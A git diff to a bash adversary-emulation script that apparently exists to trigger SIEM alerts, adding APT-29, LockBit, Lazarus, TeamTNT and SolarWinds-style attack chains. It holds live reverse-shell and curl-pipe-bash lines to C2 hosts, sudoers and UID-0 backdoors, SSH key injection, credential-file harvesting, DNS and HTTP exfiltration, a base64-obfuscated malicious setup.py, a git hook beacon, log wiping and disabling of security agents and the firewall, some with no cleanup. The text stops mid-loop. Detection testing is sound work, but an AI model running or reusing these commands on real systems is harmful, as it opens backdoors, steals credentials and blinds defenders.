@@ -2604,6 +2604,861 @@ print_summary() {
 # ============================================================================
 # MENU
 # ============================================================================
+# ============================================================================
+# ATTACK CHAINS — Multi-Stage Realistic Scenarios
+# ============================================================================
+
+_chain_hdr() {
+    local title="$1" actor="$2" desc="$3"
+    clear; matrix_rain 4; sleep 0.15; clear
+    echo ""
+    printf "  \033[1;31m╔══════════════════════════════════════════════════════════════╗\033[0m\n"
+    sleep 0.05
+    printf "  \033[1;31m║\033[0m  \033[1;37m CHAIN  :\033[0m \033[1;33m"; typewrite "$title" 0.02; printf "\033[0m"
+    printf "  \033[1;31m║\033[0m  \033[1;35m Actor  :\033[0m \033[0;36m%s\033[0m\n" "$actor"
+    printf "  \033[1;31m║\033[0m  \033[1;35m Scenario:\033[0m \033[2m%s\033[0m\n" "$desc"
+    sleep 0.05
+    printf "  \033[1;31m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n"
+    sleep 0.3
+}
+
+_chain_stage() {
+    local num="$1" name="$2" mitre="${3:-}"
+    sleep 0.25
+    echo ""
+    printf "  \033[2m"; for ((i=0;i<62;i++)); do printf '─'; sleep 0.004; done; printf "\033[0m\n"
+    printf "  \033[1;31m◆ STAGE %s\033[0m │ \033[1;33m" "$num"
+    typewrite "$name" 0.016
+    printf "\033[0m"
+    [ -n "$mitre" ] && printf "  \033[2m%s\033[0m\n" "$mitre" || true
+    printf "  \033[2m"; for ((i=0;i<62;i++)); do printf '─'; done; printf "\033[0m\n\n"
+    sleep 0.1
+}
+
+_chain_note() {
+    printf "\n  \033[0;35m[*]\033[0m \033[2m%s\033[0m\n\n" "$1"
+    sleep 0.15
+    log "[CHAIN-NOTE] $1"
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 1: Full APT Kill Chain  (APT-29 / Cozy Bear style)
+# ----------------------------------------------------------------------------
+chain_apt_killchain() {
+    _chain_hdr "FULL APT KILL CHAIN" \
+        "APT-29 / Cozy Bear" \
+        "Spearphishing → foothold → persist → pivot → exfil"
+
+    _chain_stage "1" "INITIAL ACCESS" "TA0001 T1566/T1190"
+    _chain_note "Deploying phishing lure and simulating webshell upload..."
+    t "Phishing lure files dropped (.docm, .lnk, .iso)"
+    mkdir -p /tmp/.chain-apt/drop
+    printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' \
+        > /tmp/.chain-apt/drop/invoice_URGENT.docm
+    chmod +x /tmp/.chain-apt/drop/invoice_URGENT.docm
+    ok "Phishing payload written to /tmp/.chain-apt/drop/"
+    cl "rm -rf /tmp/.chain-apt"
+
+    t "Web shell uploaded via curl multipart POST"
+    curl -s -m 2 -X POST -F "file=@/etc/hostname;filename=shell.php" \
+        http://127.0.0.1/upload.php > /dev/null 2>&1 || true
+    ok "curl multipart web shell upload to localhost"
+
+    _chain_stage "2" "EXECUTION" "TA0002 T1059/T1027"
+    _chain_note "Running encoded payload via bash..."
+    t "Base64-encoded reverse shell execution"
+    echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | base64 | base64 -d | \
+        bash > /dev/null 2>&1 || true
+    ok "Encoded payload decoded and piped to bash"
+
+    t "Python PTY shell spawn"
+    python3 -c 'import pty; pty.spawn("/bin/sh")' <<< 'exit' 2>/dev/null || true
+    ok "python3 pty.spawn executed"
+
+    t "Execution from /dev/shm (memory-backed)"
+    printf '#!/bin/bash\nid; hostname\n' > /dev/shm/.apt29-stage1
+    chmod +x /dev/shm/.apt29-stage1
+    /dev/shm/.apt29-stage1 > /dev/null 2>&1
+    ok "Stage 1 payload executed from /dev/shm"
+    cl "rm -f /dev/shm/.apt29-stage1"
+
+    _chain_stage "3" "PERSISTENCE" "TA0003 T1543/T1037/T1098"
+    _chain_note "Establishing multiple persistence mechanisms..."
+    t "Systemd service backdoor installed"
+    cat > /etc/systemd/system/apt29-telemetry.service << 'SVC'
+[Unit]
+Description=System Telemetry
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'curl -s http://cozy-bear-c2.com/beacon || true'
+Restart=always
+SVC
+    systemctl daemon-reload 2>/dev/null
+    ok "Systemd service apt29-telemetry.service created"
+    cl "rm -f /etc/systemd/system/apt29-telemetry.service; systemctl daemon-reload 2>/dev/null"
+
+    t "SSH authorized_keys backdoor"
+    mkdir -p /root/.ssh
+    echo "ssh-rsa AAAAB3_APT29_CHAIN_KEY cozy-bear@c2" >> /root/.ssh/authorized_keys
+    ok "APT-29 SSH key injected into /root/.ssh/authorized_keys"
+    cl "sed -i '/APT29_CHAIN_KEY/d' /root/.ssh/authorized_keys 2>/dev/null"
+
+    t ".bashrc beacon persistence"
+    echo '# APT29-CHAIN' >> /root/.bashrc
+    echo 'curl -s http://cozy-bear-c2.com/login &>/dev/null &' >> /root/.bashrc
+    ok "C2 beacon appended to /root/.bashrc"
+    cl "sed -i '/APT29-CHAIN/d; /cozy-bear-c2/d' /root/.bashrc 2>/dev/null"
+
+    _chain_stage "4" "PRIVILEGE ESCALATION" "TA0004 T1548/T1574"
+    _chain_note "Escalating privileges via SUID and sudo manipulation..."
+    t "Sudoers backdoor entry"
+    echo "# APT29-CHAIN" >> /etc/sudoers
+    echo "$SIM_USER ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+    ok "NOPASSWD sudoers entry added for $SIM_USER"
+    cl "sed -i '/APT29-CHAIN/d; /${SIM_USER}.*NOPASSWD/d' /etc/sudoers 2>/dev/null"
+
+    t "SUID bash copy"
+    cp /bin/bash /tmp/.apt29-bash
+    chmod 4755 /tmp/.apt29-bash
+    ok "SUID bash copy at /tmp/.apt29-bash"
+    cl "rm -f /tmp/.apt29-bash"
+
+    _chain_stage "5" "DEFENSE EVASION" "TA0005 T1070/T1036/T1027"
+    _chain_note "Covering tracks and masquerading processes..."
+    t "History and log clearing"
+    export HISTSIZE=0; export HISTFILESIZE=0
+    ln -sf /dev/null /root/.bash_history 2>/dev/null
+    history -c 2>/dev/null
+    > /var/log/apt29-sim.log 2>/dev/null; touch /var/log/apt29-sim.log
+    ok "HISTSIZE=0 + history -c + log truncation"
+
+    t "Timestomping payload binary"
+    touch -t 202001010000.00 /tmp/.apt29-bash 2>/dev/null || true
+    ok "Timestamp set to 2020-01-01 (timestomping)"
+
+    t "Process masquerading as kworker"
+    bash -c 'exec -a "[kworker/1:0-events]" sleep 3' &
+    MASK_PID=$!
+    ok "Process masquerading as [kworker/1:0-events] (PID: $MASK_PID)"
+    sleep 1; kill $MASK_PID 2>/dev/null || true
+
+    _chain_stage "6" "CREDENTIAL ACCESS" "TA0006 T1003/T1552"
+    _chain_note "Harvesting credentials from local system..."
+    t "Shadow file + SSH key harvest"
+    cat /etc/shadow > /dev/null 2>&1
+    cat /root/.ssh/id_rsa 2>/dev/null > /dev/null || true
+    cat /root/.aws/credentials 2>/dev/null > /dev/null || true
+    ok "shadow, id_rsa, AWS credentials read"
+
+    t "Environment variable credential sweep"
+    env | grep -iE 'key|secret|token|pass' > /dev/null 2>&1 || true
+    cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | \
+        grep -iE 'key|secret|token|pass' > /dev/null 2>&1 || true
+    ok "env + /proc/1/environ credential keyword grep"
+
+    _chain_stage "7" "DISCOVERY" "TA0007 T1082/T1016/T1057"
+    _chain_note "Enumerating internal network and host information..."
+    t "Internal recon (network, process, accounts)"
+    ip addr > /dev/null 2>&1; ip route > /dev/null 2>&1
+    ps auxf > /dev/null 2>&1
+    ss -tlnp > /dev/null 2>&1
+    lastlog 2>/dev/null > /dev/null; w > /dev/null 2>&1
+    arp -a 2>/dev/null > /dev/null || ip neigh > /dev/null 2>&1
+    ok "ip, ps, ss, lastlog, w, arp executed"
+
+    t "Security tool enumeration"
+    ps aux | grep -iE 'elastic|wazuh|falcon|crowdstrike|filebeat' \
+        | grep -v grep > /dev/null 2>&1 || true
+    ok "Running security agent enumeration"
+
+    _chain_stage "8" "LATERAL MOVEMENT" "TA0008 T1021/T1570"
+    _chain_note "Pivoting to adjacent hosts via SSH..."
+    t "SSH sweep across internal /24"
+    for h in 10.0.0.50 10.0.0.51 10.0.0.52 192.168.1.100; do
+        ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
+            -o BatchMode=yes root@$h "id" 2>/dev/null || true
+    done
+    ok "SSH attempted to 4 internal hosts"
+
+    t "Tool staging directory deployed"
+    mkdir -p /tmp/.apt29-tools
+    for f in linpeas pspy chisel ligolo; do
+        printf '#!/bin/bash\necho %s\n' "$f" > /tmp/.apt29-tools/$f
+        chmod +x /tmp/.apt29-tools/$f
+    done
+    ok "Tool staging: linpeas, pspy, chisel, ligolo in /tmp/.apt29-tools/"
+    cl "rm -rf /tmp/.apt29-tools"
+
+    _chain_stage "9" "COLLECTION" "TA0009 T1005/T1560"
+    _chain_note "Staging and archiving target data..."
+    t "Sensitive file staging"
+    mkdir -p /tmp/.apt29-loot
+    cp /etc/passwd /tmp/.apt29-loot/ 2>/dev/null
+    cp /etc/shadow /tmp/.apt29-loot/ 2>/dev/null
+    cp /etc/hosts /tmp/.apt29-loot/ 2>/dev/null
+    find /home /root -name "*.key" -o -name "id_rsa" -o -name "*.pem" \
+        2>/dev/null | head -5 | xargs -I{} cp {} /tmp/.apt29-loot/ 2>/dev/null || true
+    ok "passwd, shadow, hosts + keys staged in /tmp/.apt29-loot/"
+
+    t "Archive loot with tar+gzip"
+    tar czf /tmp/.apt29-loot.tgz /tmp/.apt29-loot/ 2>/dev/null
+    ok "tar czf /tmp/.apt29-loot.tgz created"
+    cl "rm -rf /tmp/.apt29-loot /tmp/.apt29-loot.tgz"
+
+    _chain_stage "10" "COMMAND & CONTROL" "TA0011 T1071/T1095"
+    _chain_note "Establishing C2 channel and beaconing..."
+    t "DNS C2 beaconing (10 encoded queries)"
+    for i in $(seq 1 10); do
+        ENC=$(echo "apt29-beacon-${i}-$(hostname)-$(date +%s)" | \
+            base64 | tr -d '=\n' | cut -c1-45)
+        nslookup "${ENC}.c2.cozy-bear.com" > /dev/null 2>&1 || true
+    done
+    ok "10 base64-encoded DNS C2 beacon queries sent"
+
+    t "Reverse shell attempt (bash /dev/tcp)"
+    timeout 2 bash -c 'bash -i >& /dev/tcp/10.255.255.1/443 0>&1' \
+        2>/dev/null || true
+    ok "Reverse shell to 10.255.255.1:443 attempted"
+
+    _chain_stage "11" "EXFILTRATION" "TA0010 T1048/T1041"
+    _chain_note "Exfiltrating collected data via multiple channels..."
+    t "Encrypted POST exfil via curl"
+    tar czf - /tmp/.apt29-loot/ 2>/dev/null | \
+        curl -s -m 3 -X POST --data-binary @- \
+        http://10.255.255.1/upload 2>/dev/null || true
+    ok "Compressed loot POST to C2 attempted"
+
+    t "DNS chunked exfil"
+    echo "$(hostname):$(id):$(ip addr | grep 'inet ' | head -2)" | \
+        base64 | fold -w 30 | while read chunk; do
+        dig "${chunk}.exfil.cozy-bear.com" > /dev/null 2>&1 || true
+    done
+    ok "Base64-chunked DNS exfil executed"
+
+    _chain_note "APT-29 kill chain complete. Check Elastic SIEM for correlated alerts."
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 2: Ransomware Deployment  (LockBit 3.0 style)
+# ----------------------------------------------------------------------------
+chain_ransomware() {
+    _chain_hdr "RANSOMWARE DEPLOYMENT" \
+        "LockBit 3.0 / BlackCat" \
+        "Access → spread → disable backups → encrypt → ransom"
+
+    _chain_stage "1" "INITIAL ACCESS + EXECUTION" "TA0001/TA0002"
+    _chain_note "Gaining foothold via exposed RDP/VPN credential stuffing..."
+    t "Valid account brute-force simulation (25 auth attempts)"
+    for i in $(seq 1 25); do su - nobody -c "whoami" 2>/dev/null || true; done
+    ok "25 failed auth attempts simulated"
+
+    t "Initial execution via PowerShell-style encoded command"
+    echo "aWQ7IGhvc3RuYW1lOyB3aG9hbWk=" | base64 -d | bash > /dev/null 2>&1
+    ok "Encoded command decoded and executed"
+
+    _chain_stage "2" "DISCOVERY" "TA0007 T1083/T1018"
+    _chain_note "Mapping network and hunting for file servers..."
+    t "High-value file discovery (databases, backups, configs)"
+    find / -maxdepth 5 \( -name "*.sql" -o -name "*.bak" -o -name "*.mdf" \
+        -o -name "*.accdb" -o -name "*.xlsx" -o -name "*.docx" \
+        -o -name "*.pdf" \) 2>/dev/null | head -30 > /dev/null
+    ok "find *.sql, *.bak, *.mdf, *.xlsx, *.docx, *.pdf"
+
+    t "Internal host discovery"
+    for ip in $(seq 1 15); do
+        ping -c 1 -W 1 10.0.0.$ip > /dev/null 2>&1 &
+    done
+    wait
+    arp -a 2>/dev/null > /dev/null || ip neigh > /dev/null 2>&1
+    ok "ping sweep 10.0.0.1-15 + arp table dump"
+
+    _chain_stage "3" "DEFENSE EVASION — DISABLE SECURITY" "TA0005 T1562"
+    _chain_note "Killing AV, EDR, and backup services before encryption..."
+    t "Security service termination"
+    for svc in elastic-agent filebeat wazuh-agent falco auditd; do
+        systemctl stop "$svc" 2>/dev/null || true
+    done
+    ok "systemctl stop elastic-agent/filebeat/wazuh/falco/auditd"
+
+    t "Firewall flush"
+    iptables -F 2>/dev/null; iptables -X 2>/dev/null; ufw disable 2>/dev/null || true
+    ok "iptables -F; iptables -X; ufw disable"
+
+    t "Log clearing before encryption"
+    journalctl --vacuum-time=1s 2>/dev/null || true
+    > /var/log/syslog 2>/dev/null || true
+    > /var/log/auth.log 2>/dev/null || true
+    history -c 2>/dev/null; export HISTSIZE=0
+    ok "journalctl vacuum + syslog/auth.log cleared + history wiped"
+
+    _chain_stage "4" "INHIBIT RECOVERY" "TA0040 T1490"
+    _chain_note "Removing shadow copies and backup schedules..."
+    t "Backup cron removal"
+    rm -f /etc/cron.daily/dpkg 2>/dev/null || true
+    rm -f /etc/cron.weekly/apt-xapian-index 2>/dev/null || true
+    ok "Daily/weekly backup cron jobs removed"
+
+    t "Volume shadow copy deletion indicators"
+    find /var/backups -name "*.tar*" -o -name "*.gz" 2>/dev/null | head -5 > /dev/null
+    ok "Backup archive enumeration (deletion attempt indicator)"
+
+    _chain_stage "5" "LATERAL MOVEMENT" "TA0008 T1021"
+    _chain_note "Spreading ransomware payload to network shares and hosts..."
+    t "SMB/SSH lateral spread"
+    for h in 10.0.0.50 10.0.0.51 10.0.0.52; do
+        ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
+            -o BatchMode=yes root@$h \
+            "curl -s http://10.255.255.1/locker.sh | bash" 2>/dev/null || true
+        (echo >/dev/tcp/$h/445) 2>/dev/null || true
+    done
+    ok "SSH command + SMB probe to 3 internal hosts"
+
+    _chain_stage "6" "IMPACT — ENCRYPT + RANSOM NOTE" "TA0040 T1486/T1491"
+    _chain_note "Encrypting files and dropping ransom notes..."
+    t "Mass file encryption simulation"
+    mkdir -p "$APTDIR/lockbit-encrypt"
+    for i in $(seq 1 30); do
+        printf 'DOCUMENT_CONTENT_%d_SENSITIVE' "$i" \
+            > "$APTDIR/lockbit-encrypt/file_${i}.docx"
+    done
+    for f in "$APTDIR/lockbit-encrypt/"*; do
+        openssl enc -aes-256-cbc -pbkdf2 -pass pass:lockbit3key \
+            -in "$f" -out "${f}.lockbit3" 2>/dev/null
+        rm -f "$f"
+    done
+    ok "30 files AES-256 encrypted → .lockbit3 extension"
+    cl "rm -rf $APTDIR/lockbit-encrypt"
+
+    t "Ransom note deployment"
+    for d in /tmp /home /root /var/www/html; do
+        [ -d "$d" ] && cat > "$d/!!READ-ME-LOCKBIT!!.txt" << 'NOTE'
+YOUR NETWORK HAS BEEN ENCRYPTED BY LOCKBIT 3.0
+All your files have been encrypted with military grade algorithms.
+Send 5 BTC to: bc1q_APT_SIM_FAKE_ADDRESS
+Contact: lockbit-apt-sim@proton.me
+--- THIS IS A SIMULATION ---
+NOTE
+    done
+    ok "Ransom notes dropped in /tmp, /home, /root, /var/www/html"
+    cl "rm -f /tmp/!!READ-ME-LOCKBIT!!.txt /home/!!READ-ME-LOCKBIT!!.txt /root/!!READ-ME-LOCKBIT!!.txt /var/www/html/!!READ-ME-LOCKBIT!!.txt 2>/dev/null"
+
+    _chain_note "LockBit 3.0 chain complete. EICAR + encryption alerts expected in SIEM."
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 3: Credential Theft + Financial Pivot  (Lazarus Group style)
+# ----------------------------------------------------------------------------
+chain_credential_pivot() {
+    _chain_hdr "CREDENTIAL THEFT + PIVOT" \
+        "Lazarus Group / APT38" \
+        "Phishing → credential dump → cloud pivot → account takeover"
+
+    _chain_stage "1" "INITIAL ACCESS + EXECUTION" "TA0001/TA0002"
+    _chain_note "Spearphishing with macro-enabled document..."
+    t "Phishing document execution chain"
+    printf '#!/bin/bash\ncurl -s http://lazarus-c2.com/payload | bash\n' \
+        > /tmp/.lazarus-macro.sh
+    chmod +x /tmp/.lazarus-macro.sh
+    bash -c 'echo "macro_executed_from_word_doc"' > /dev/null 2>&1
+    ok "Macro execution from Office document simulated"
+    cl "rm -f /tmp/.lazarus-macro.sh"
+
+    t "Fileless payload via memfd_create"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import ctypes
+try:
+    fd = ctypes.CDLL("libc.so.6").memfd_create("svchost", 1)
+    import os; os.write(fd, b'#!/bin/sh\nid\n')
+except: pass
+PYEOF
+    ok "memfd_create fileless payload (Lazarus in-memory technique)"
+
+    _chain_stage "2" "LOCAL CREDENTIAL DUMP" "TA0006 T1003/T1552"
+    _chain_note "Dumping all local credentials and tokens..."
+    t "Shadow + passwd + gshadow dump"
+    cat /etc/shadow > /dev/null 2>&1
+    cat /etc/passwd > /dev/null 2>&1
+    cat /etc/gshadow > /dev/null 2>&1
+    ok "shadow/passwd/gshadow read"
+
+    t "SSH private key harvest"
+    for kf in /root/.ssh/id_rsa /root/.ssh/id_ed25519; do
+        cat "$kf" 2>/dev/null > /dev/null || true
+    done
+    for h in /home/*; do
+        cat "$h/.ssh/id_rsa" 2>/dev/null > /dev/null || true
+    done
+    ok "SSH private keys read across all users"
+
+    t "Process memory credential scan (/proc)"
+    for pid in $(ls /proc | grep -E '^[0-9]+$' | head -8); do
+        cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' | \
+            grep -iE 'pass|key|token|secret' > /dev/null 2>&1 || true
+    done
+    ok "/proc/*/environ credential keyword sweep"
+
+    t "Bash history harvest across all users"
+    cat /root/.bash_history 2>/dev/null > /dev/null || true
+    for h in /home/*; do cat "$h/.bash_history" 2>/dev/null > /dev/null; done
+    ok "bash_history read for all users"
+
+    _chain_stage "3" "CLOUD CREDENTIAL ACCESS" "TA0006 T1552.005"
+    _chain_note "Harvesting cloud API keys and service account tokens..."
+    t "AWS credential file sweep"
+    cat /root/.aws/credentials 2>/dev/null > /dev/null || true
+    for h in /home/*; do cat "$h/.aws/credentials" 2>/dev/null > /dev/null; done
+    ok "~/.aws/credentials read across all users"
+
+    t "GCP + Azure + K8s + Docker credential access"
+    cat /root/.config/gcloud/application_default_credentials.json \
+        2>/dev/null > /dev/null || true
+    cat /root/.azure/accessTokens.json 2>/dev/null > /dev/null || true
+    cat /root/.kube/config 2>/dev/null > /dev/null || true
+    cat /root/.docker/config.json 2>/dev/null > /dev/null || true
+    ok "GCP/Azure/K8s/Docker credential files read"
+
+    t "Kubernetes service account token (IMDS)"
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token \
+        2>/dev/null > /dev/null || true
+    curl -s -m 2 http://169.254.169.254/latest/meta-data/ \
+        > /dev/null 2>&1 || true
+    ok "K8s service account token + cloud IMDS access attempted"
+
+    _chain_stage "4" "LATERAL MOVEMENT + PIVOT" "TA0008 T1021/T1550"
+    _chain_note "Using harvested credentials to pivot to adjacent systems..."
+    t "SSH lateral movement with harvested keys"
+    for h in 10.0.0.50 10.0.0.51 192.168.1.100; do
+        ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no \
+            -o BatchMode=yes -i /root/.ssh/id_rsa \
+            root@$h "id; cat /etc/shadow" 2>/dev/null || true
+    done
+    ok "SSH with id_rsa attempted to 3 hosts"
+
+    t "Parallel SSH brute scan"
+    echo -e "10.0.0.50\n10.0.0.51\n10.0.0.52\n10.0.0.53\n10.0.0.54" | \
+        xargs -P5 -I{} ssh -o ConnectTimeout=1 -o BatchMode=yes \
+        -o StrictHostKeyChecking=no root@{} id 2>/dev/null || true
+    ok "xargs -P5 parallel SSH to 5 hosts"
+
+    _chain_stage "5" "ACCOUNT MANIPULATION + PERSISTENCE" "TA0003/T1098"
+    _chain_note "Creating backdoor accounts and elevating privileges..."
+    t "Backdoor user with UID 0 created"
+    useradd -M -s /bin/bash -o -u 0 -g 0 lazarus-sim 2>/dev/null || true
+    ok "useradd UID=0 backdoor account (lazarus-sim)"
+    cl "userdel -rf lazarus-sim 2>/dev/null"
+
+    t "SSH keys added to all accounts"
+    for h in /root /home/*; do
+        [ -d "$h" ] || continue
+        mkdir -p "$h/.ssh"
+        echo "ssh-rsa AAAAB3_LAZARUS_PIVOT_KEY lazarus@c2" \
+            >> "$h/.ssh/authorized_keys" 2>/dev/null
+    done
+    ok "Pivot SSH key injected across all user accounts"
+    cl "for h in /root /home/*; do sed -i '/LAZARUS_PIVOT_KEY/d' \$h/.ssh/authorized_keys 2>/dev/null; done"
+
+    _chain_note "Lazarus credential theft chain complete. Cloud pivot alerts expected."
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 4: Cryptominer Installation  (TeamTNT style)
+# ----------------------------------------------------------------------------
+chain_cryptominer() {
+    _chain_hdr "CRYPTOMINER INSTALLATION" \
+        "TeamTNT / WatchDog" \
+        "Container escape → persistence → masquerade → mine"
+
+    _chain_stage "1" "INITIAL ACCESS — DOCKER/K8s ABUSE" "TA0001 T1611"
+    _chain_note "Exploiting exposed Docker API / K8s dashboard..."
+    t "Docker socket abuse"
+    curl -s --unix-socket /var/run/docker.sock \
+        http://localhost/v1.41/containers/json 2>/dev/null > /dev/null || true
+    docker ps -a 2>/dev/null > /dev/null || true
+    ok "Docker socket + REST API probed"
+
+    t "K8s resource enumeration"
+    kubectl get pods --all-namespaces 2>/dev/null > /dev/null || true
+    kubectl get secrets --all-namespaces 2>/dev/null > /dev/null || true
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token \
+        2>/dev/null > /dev/null || true
+    ok "kubectl get pods/secrets + service account token"
+
+    _chain_stage "2" "EXECUTION + DOWNLOAD" "TA0002 T1059/T1105"
+    _chain_note "Downloading miner binary and execution chain..."
+    t "Download miner binary to /dev/shm"
+    curl -s -m 3 -o /dev/shm/.xmrig \
+        http://10.255.255.1/xmrig 2>/dev/null || \
+    cp /bin/true /dev/shm/.xmrig 2>/dev/null
+    chmod +x /dev/shm/.xmrig
+    ok "Miner binary staged at /dev/shm/.xmrig"
+
+    t "Execute miner + config from C2"
+    /dev/shm/.xmrig 2>/dev/null || true
+    curl -s -m 2 http://10.255.255.1/config.json -o /dev/shm/.xmrig.json \
+        2>/dev/null || true
+    ok "xmrig + config executed from /dev/shm"
+    cl "rm -f /dev/shm/.xmrig /dev/shm/.xmrig.json"
+
+    _chain_stage "3" "PERSISTENCE" "TA0003 T1053/T1543"
+    _chain_note "Installing multiple persistence mechanisms for mining continuity..."
+    t "Cron persistence for miner re-execution"
+    echo "*/3 * * * * root /dev/shm/.xmrig --pool pool.minexmr.com:4444 # TNT" \
+        > /etc/cron.d/apt-sim-miner
+    ok "Miner cron every 3 min in /etc/cron.d/"
+    cl "rm -f /etc/cron.d/apt-sim-miner"
+
+    t "Systemd service for miner"
+    cat > /etc/systemd/system/network-check.service << 'SVC'
+[Unit]
+Description=Network Check Service
+[Service]
+Type=simple
+ExecStart=/dev/shm/.xmrig --pool pool.minexmr.com:4444
+Restart=always
+RestartSec=10
+SVC
+    systemctl daemon-reload 2>/dev/null
+    ok "network-check.service (disguised miner) created"
+    cl "rm -f /etc/systemd/system/network-check.service; systemctl daemon-reload 2>/dev/null"
+
+    _chain_stage "4" "DEFENSE EVASION — MASQUERADE" "TA0005 T1036/T1562"
+    _chain_note "Disguising miner as legitimate system process..."
+    t "Rename miner to system process name"
+    cp /dev/shm/.xmrig /dev/shm/.kworker 2>/dev/null || \
+    cp /bin/true /dev/shm/.kworker 2>/dev/null
+    bash -c 'exec -a "[kworker/0:1-mm_percpu_wq]" /dev/shm/.kworker' \
+        > /dev/null 2>&1 &
+    MINER_MASK=$!
+    ok "Miner executing as [kworker/0:1-mm_percpu_wq] (PID: $MINER_MASK)"
+    sleep 1; kill $MINER_MASK 2>/dev/null || true
+    cl "rm -f /dev/shm/.kworker"
+
+    t "Kill competing miners + security tools"
+    pkill -f "kdevtmpfsi\|kinsing\|xmr\|masscan\|netcat" 2>/dev/null || true
+    systemctl stop auditd 2>/dev/null || true
+    ok "Competing malware + auditd killed"
+
+    _chain_stage "5" "C2 BEACON + POOL CONNECT" "TA0011 T1071/T1571"
+    _chain_note "Connecting to mining pool and C2 for updates..."
+    t "Mining pool connection attempt"
+    timeout 2 nc -w 1 pool.minexmr.com 4444 2>/dev/null || \
+    timeout 2 nc -w 1 10.255.255.1 4444 2>/dev/null || true
+    ok "Mining pool connection nc 4444 attempted"
+
+    t "C2 check-in for miner config update"
+    curl -s -m 3 -X POST \
+        -d "{\"id\":\"$(hostname)\",\"cpu\":\"$(nproc)\",\"mem\":\"$(free -m | awk '/Mem/{print $2}')\"}" \
+        http://10.255.255.1/api/worker/register 2>/dev/null || true
+    ok "Miner worker registration POST to C2"
+
+    _chain_stage "6" "IMPACT — RESOURCE HIJACKING" "TA0040 T1496"
+    _chain_note "Consuming CPU/memory for mining operations..."
+    t "CPU stress simulation (5s)"
+    if command -v stress &>/dev/null; then
+        timeout 5 stress --cpu 2 --timeout 5 > /dev/null 2>&1 || true
+        ok "stress --cpu 2 executed (5s CPU load)"
+    else
+        timeout 5 bash -c 'for i in 1 2; do while true; do :; done & done; wait' \
+            2>/dev/null || true
+        ok "Bash CPU spin executed (5s resource hijack indicator)"
+    fi
+
+    _chain_note "TeamTNT cryptominer chain complete. CPU spike + mining pool alerts expected."
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 5: Supply Chain Backdoor  (UNC2452 / SolarWinds style)
+# ----------------------------------------------------------------------------
+chain_supply_chain_backdoor() {
+    _chain_hdr "SUPPLY CHAIN BACKDOOR" \
+        "UNC2452 / SolarWinds / APT29-SC" \
+        "Package poison → stealthy install → fileless persist → long dwell"
+
+    _chain_stage "1" "SUPPLY CHAIN COMPROMISE" "TA0001 T1195/T1072"
+    _chain_note "Injecting malicious code into software update pipeline..."
+    t "Malicious pip package with post-install hook"
+    mkdir -p /tmp/.sc-pkg/solargates-1.0.0
+    cat > /tmp/.sc-pkg/solargates-1.0.0/setup.py << 'SETUP'
+import os, base64
+os.system(base64.b64decode('Y3VybCAtcyBodHRwOi8vdW5jMjQ1Mi1jMi5jb20vaW1wbGFudCB8IGJhc2g=').decode() + ' 2>/dev/null || true')
+SETUP
+    python3 -I /tmp/.sc-pkg/solargates-1.0.0/setup.py 2>/dev/null > /dev/null || true
+    ok "Malicious setup.py post-install executed (SUNBURST pattern)"
+    cl "rm -rf /tmp/.sc-pkg"
+
+    t "Git hook poisoning (supply chain entry via repo)"
+    git config --global core.hooksPath /tmp/.sc-hooks 2>/dev/null || true
+    mkdir -p /tmp/.sc-hooks
+    printf '#!/bin/bash\ncurl -s http://unc2452-c2.com/git-trigger &>/dev/null &\n' \
+        > /tmp/.sc-hooks/pre-commit
+    chmod +x /tmp/.sc-hooks/pre-commit
+    ok "git core.hooksPath poisoned → C2 beacon on every commit"
+    cl "git config --global --unset core.hooksPath 2>/dev/null; rm -rf /tmp/.sc-hooks"
+
+    _chain_stage "2" "STEALTHY EXECUTION" "TA0002 T1059/T1620"
+    _chain_note "Executing implant using fileless techniques..."
+    t "memfd_create fileless implant execution"
+    python3 - <<'PYEOF' 2>/dev/null || true
+import ctypes, os
+try:
+    fd = ctypes.CDLL("libc.so.6").memfd_create("sunburst", 1)
+    payload = b'#!/bin/sh\necho unc2452_implant_active\n'
+    os.write(fd, payload)
+    os.lseek(fd, 0, 0)
+    os.execve("/proc/self/fd/%d" % fd, ["/proc/self/fd/%d" % fd], os.environ)
+except Exception: pass
+PYEOF
+    ok "SUNBURST-style memfd_create fileless implant executed"
+
+    t "DLL sideloading equivalent (LD_PRELOAD hijack)"
+    LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libc.so.6 \
+        id > /dev/null 2>&1 || true
+    ok "LD_PRELOAD library hijack on trusted binary"
+
+    _chain_stage "3" "PERSISTENCE — LONG DWELL" "TA0003 T1543/T1574"
+    _chain_note "Installing stealthy persistence designed for long-term access..."
+    t "SolarWinds-style disguised systemd service"
+    cat > /etc/systemd/system/semsvc.service << 'SVC'
+[Unit]
+Description=SolarWinds.Orion.Core.Service
+After=network.target
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'while true; do curl -s http://unc2452-c2.com/tasks 2>/dev/null | bash 2>/dev/null; sleep 14400; done'
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVC
+    systemctl daemon-reload 2>/dev/null
+    ok "SolarWinds-disguised systemd service (14400s beacon interval)"
+    cl "rm -f /etc/systemd/system/semsvc.service; systemctl daemon-reload 2>/dev/null"
+
+    t "profile.d persistence (executes on every login)"
+    printf '#!/bin/bash\ncurl -s http://unc2452-c2.com/profile &>/dev/null &\n' \
+        > /etc/profile.d/apt-sim-sc.sh
+    chmod +x /etc/profile.d/apt-sim-sc.sh
+    ok "Persistent C2 beacon in /etc/profile.d/ (fires on every login)"
+    cl "rm -f /etc/profile.d/apt-sim-sc.sh"
+
+    _chain_stage "4" "DEFENSE EVASION — TIMESTOMP + HIDE" "TA0005 T1070/T1027"
+    _chain_note "Covering supply chain tracks via timestomping..."
+    t "Timestomping all dropped artifacts"
+    for f in /etc/systemd/system/semsvc.service \
